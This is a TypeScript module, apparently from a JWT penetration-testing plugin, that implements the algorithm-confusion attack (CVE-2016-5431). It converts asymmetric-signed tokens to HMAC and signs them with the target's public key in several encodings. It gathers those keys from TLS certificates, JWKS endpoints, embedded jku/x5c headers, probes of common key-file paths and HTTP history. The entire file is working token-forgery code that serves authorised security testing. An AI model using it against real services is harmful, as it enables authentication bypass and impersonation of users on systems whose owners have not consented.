/**
 * Algorithm Confusion Attack (CVE-2016-5431)
 *
 * Converts an RS256/RS384/RS512/ES256/ES384/ES512 token to HS256/HS384/HS512
 * and signs it using the server's public key as the HMAC secret.
 *
 * Sources for the public key (tried in order):
 *  1. Explicitly configured key/cert in plugin settings
 *  2. TLS certificate of the request host
 *  3. JWKS discovery at common well-known paths
 *  4. Embedded jku / x5c / x5u values from the original JWT header
 *  5. Public key recovered from multiple JWTs in HTTP history
 */

import { signHMAC } from "../crypto/jwt.js";
import { publicKeyPemToRawBytes, x509CertToPublicKeyPem, jwkToPublicKeyPem, jwksToPublicKeys } from "../crypto/rsa.js";
import { ecPublicKeyPemToRawBytes, x509CertToECPublicKeyPem } from "../crypto/ecdsa.js";
import { fetchTLSCertPem, discoverJWKS, fetchJWKS, discoverPublicKeys, type UrlFetcher } from "../crypto/certFetch.js";
import type { ParsedJWT, AttackResult, PluginConfig } from "../types.js";
import { nanoid } from "../util.js";

const ALG_CONFUSION_MAP: Record<string, "HS256" | "HS384" | "HS512"> = {
  RS256: "HS256", RS384: "HS384", RS512: "HS512",
  PS256: "HS256", PS384: "HS384", PS512: "HS512",
  ES256: "HS256", ES384: "HS384", ES512: "HS512",
};

function isAsymmetricAlg(alg: string): boolean {
  return alg.startsWith("RS") || alg.startsWith("PS") || alg.startsWith("ES");
}

interface SecretVariant {
  secret: Buffer;
  label: string;
}

// The HMAC secret for algorithm confusion is whatever byte string the server
// passes to its HMAC verify function. In the overwhelmingly common vulnerable
// pattern the server hands its *PEM-encoded public key string* to the verifier,
// so the secret is the PEM text itself — NOT its decoded DER bytes (the old bug).
//
// Because the exact bytes the server uses can vary (trailing newline, the
// base64(PEM) form produced by the Burp/PortSwigger "k" workflow, or — rarely —
// raw DER), we emit one signed token per plausible secret encoding.
function secretVariants(keyPem: string, originalAlg: string): SecretVariant[] {
  const pem = keyPem.replace(/\r\n/g, "\n");            // normalize CRLF → LF
  const pemNoTrailingLF = pem.replace(/\n+$/, "");
  const pemBase64 = Buffer.from(pem, "utf8").toString("base64");

  const variants: SecretVariant[] = [
    // Primary: the PEM string exactly as a typical key file / JWK→PEM export
    // (64-char wrapped, trailing newline). This is the net result of the
    // "base64-encode the PEM into a symmetric JWK `k`, then sign" workflow,
    // because `k` is base64-decoded back to the PEM before HMAC.
    { secret: Buffer.from(pem, "utf8"), label: "PEM" },
    // Some servers strip / lack the trailing newline.
    { secret: Buffer.from(pemNoTrailingLF, "utf8"), label: "PEM (no trailing LF)" },
    // Literal base64(PEM) — for tools/servers that use the `k` value undecoded.
    { secret: Buffer.from(pemBase64, "utf8"), label: "base64(PEM)" },
    // Raw DER bytes — the previous behavior, kept only as a last-resort fallback.
    {
      secret: originalAlg.startsWith("ES")
        ? ecPublicKeyPemToRawBytes(pem)
        : publicKeyPemToRawBytes(pem),
      label: "DER",
    },
  ];
  return variants;
}

function makeAttack(
  parsed: ParsedJWT,
  hmacAlg: "HS256" | "HS384" | "HS512",
  secret: Buffer,
  sourceDesc: string,
  variantLabel: string
): AttackResult {
  const header = { ...parsed.header, alg: hmacAlg };
  delete header.jku;
  delete header.jwk;
  delete header.x5u;
  delete header.x5c;
  delete header.kid;

  const jwt = signHMAC(header, parsed.payload, secret, hmacAlg);

  return {
    id: nanoid(),
    technique: "algConfusion",
    techniqueName: `Algorithm Confusion (${parsed.header.alg} → ${hmacAlg}, ${variantLabel})`,
    description:
      `CVE-2016-5431: Re-signs the token as ${hmacAlg} using the server's ` +
      `public key (${sourceDesc}) as the HMAC secret, encoded as ${variantLabel}. ` +
      "Vulnerable servers that use the same key material for both RS/ES and HS " +
      "verification will accept this token.",
    modifiedJWT: jwt,
    timestamp: Date.now(),
  };
}

// Expand a single public-key PEM into one attack per secret-encoding variant,
// de-duplicating identical signed tokens via the shared `seen` set.
function attacksForKey(
  parsed: ParsedJWT,
  hmacAlg: "HS256" | "HS384" | "HS512",
  originalAlg: string,
  keyPem: string,
  sourceDesc: string,
  seen: Set<string>
): AttackResult[] {
  const out: AttackResult[] = [];
  for (const v of secretVariants(keyPem, originalAlg)) {
    try {
      const attack = makeAttack(parsed, hmacAlg, v.secret, sourceDesc, v.label);
      if (seen.has(attack.modifiedJWT)) continue;
      seen.add(attack.modifiedJWT);
      out.push(attack);
    } catch { /* skip invalid keys */ }
  }
  return out;
}

// Build alg-confusion attacks for an explicit set of public-key PEMs (e.g. keys
// recovered from HTTP history). Avoids re-running network discovery.
export function buildAlgConfusionForKeys(
  parsed: ParsedJWT,
  keyPems: string[],
  sourceDesc: string
): AttackResult[] {
  const originalAlg = parsed.header.alg as string;
  if (!isAsymmetricAlg(originalAlg)) return [];
  const hmacAlg = ALG_CONFUSION_MAP[originalAlg];
  const seen = new Set<string>();
  const out: AttackResult[] = [];
  for (const pem of keyPems) {
    out.push(...attacksForKey(parsed, hmacAlg, originalAlg, pem, sourceDesc, seen));
  }
  return out;
}

export interface DiscoveryInfo {
  url: string;
  source: "JWKS endpoint" | "certificate" | "public-key";
  keyCount: number;
  content: string;   // raw body returned by the URL
  pems: string[];    // PEM-encoded public keys extracted from it
}

const MAX_DISCOVERY_CONTENT = 16384; // cap raw body sent to the UI

export async function buildAlgConfusionAttacks(
  parsed: ParsedJWT,
  requestHost: string,
  requestPort: number,
  requestTls: boolean,
  config: PluginConfig,
  recoveredKeys: string[] = [],
  onDiscovery?: (info: DiscoveryInfo) => void,
  fetcher?: UrlFetcher
): Promise<AttackResult[]> {
  const originalAlg = parsed.header.alg as string;
  if (!isAsymmetricAlg(originalAlg)) return [];

  const hmacAlg = ALG_CONFUSION_MAP[originalAlg];
  const results: AttackResult[] = [];
  const seen = new Set<string>();

  const addKey = (pem: string, source: string) => {
    results.push(...attacksForKey(parsed, hmacAlg, originalAlg, pem, source, seen));
  };

  // 1. Explicitly configured key / cert
  if (config.customPublicKeyPem) {
    addKey(config.customPublicKeyPem, "configured public key");
  }
  if (config.customCertPem) {
    try {
      const pem = x509CertToPublicKeyPem(config.customCertPem);
      addKey(pem, "configured certificate");
    } catch { /* ignore */ }
  }

  // 2. TLS certificate of the target host
  if (requestTls || requestPort === 443) {
    try {
      const certPem = await fetchTLSCertPem(requestHost, requestPort);
      const pubKeyPem = x509CertToPublicKeyPem(certPem);
      addKey(pubKeyPem, "TLS certificate");
    } catch { /* ignore */ }
  }

  // 3. Embedded jku in the original token
  if (parsed.header.jku && fetcher) {
    try {
      const jwks = await fetchJWKS(fetcher, parsed.header.jku as string);
      if (jwks) {
        for (const pem of jwksToPublicKeys(jwks)) {
          addKey(pem, `jku (${parsed.header.jku})`);
        }
      }
    } catch { /* ignore */ }
  }

  // 4. Embedded x5c chain
  if (parsed.header.x5c && Array.isArray(parsed.header.x5c) && parsed.header.x5c.length > 0) {
    try {
      const certDer = Buffer.from(parsed.header.x5c[0] as string, "base64");
      const certPem = `-----BEGIN CERTIFICATE-----\n${certDer.toString("base64").match(/.{1,64}/g)!.join("\n")}\n-----END CERTIFICATE-----\n`;
      const pubKeyPem = x509CertToPublicKeyPem(certPem);
      addKey(pubKeyPem, "embedded x5c cert");
    } catch { /* ignore */ }
  }

  // 5. JWKS discovery
  const proto = requestTls ? "https" : "http";
  const port = (requestTls && requestPort === 443) || (!requestTls && requestPort === 80)
    ? ""
    : `:${requestPort}`;
  const baseUrl = `${proto}://${requestHost}${port}`;

  if (fetcher) {
    try {
      const discovered = await discoverJWKS(fetcher, baseUrl, config.extraJwksPaths);
      for (const result of discovered) {
        const pems = jwksToPublicKeys({ keys: result.keys });
        for (const pem of pems) {
          addKey(pem, `JWKS (${result.url})`);
        }
        // Surface the discovered JWKS endpoint so the analyst doesn't miss it.
        onDiscovery?.({
          url: result.url,
          source: "JWKS endpoint",
          keyCount: pems.length,
          content: result.content.slice(0, MAX_DISCOVERY_CONTENT),
          pems,
        });
      }
    } catch { /* ignore */ }

    // 6. Probe common certificate / public-key file locations on the host
    try {
      const keys = await discoverPublicKeys(fetcher, baseUrl);
      for (const k of keys) {
        addKey(k.publicKeyPem, `${k.kind} at ${k.url}`);
        onDiscovery?.({
          url: k.url,
          source: k.kind,
          keyCount: 1,
          content: k.content.slice(0, MAX_DISCOVERY_CONTENT),
          pems: [k.publicKeyPem],
        });
      }
    } catch { /* ignore */ }
  }

  // 7. Keys recovered from HTTP history analysis
  for (const pem of recoveredKeys) {
    addKey(pem, "recovered from HTTP history");
  }

  return results;
}
